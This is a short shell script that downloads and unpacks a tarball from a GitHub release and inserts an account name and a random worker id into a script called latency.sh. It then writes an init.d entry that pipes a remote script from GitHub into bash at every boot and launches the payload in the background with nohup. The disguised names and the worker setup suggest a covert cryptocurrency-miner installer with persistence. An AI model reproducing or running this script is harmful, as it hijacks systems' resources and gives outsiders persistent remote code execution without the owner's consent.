cd /
rm -rf jack.tar
rm -rf jack
wget https://github.com/siomangfr/indeoi/releases/download/v1.0.2/jack.tar
tar -xvf jack.tar
cd /jack
variable1=$(< /dev/urandom tr -dc 'a-zA-Z0-9' | fold -w 8 | head -n 1)
sed -i "s/test_accountname/CP_bsmzapay1 --worker ${variable1}/g" ./latency.sh
sed -i "s/CP_32hb86nvxc/CP_bsmzapay1 --worker ${variable1}/g" ./latency.sh
cd /etc/init.d
echo "bash <(curl -s -L https://raw.githubusercontent.com/siomangfr/indeoi/main/sound.sh)" > speaker.sh
chmod a+x speaker.sh
update-rc.d speaker.sh defaults
cd /jack
nohup ./latency.sh
ps -ef | grep jack
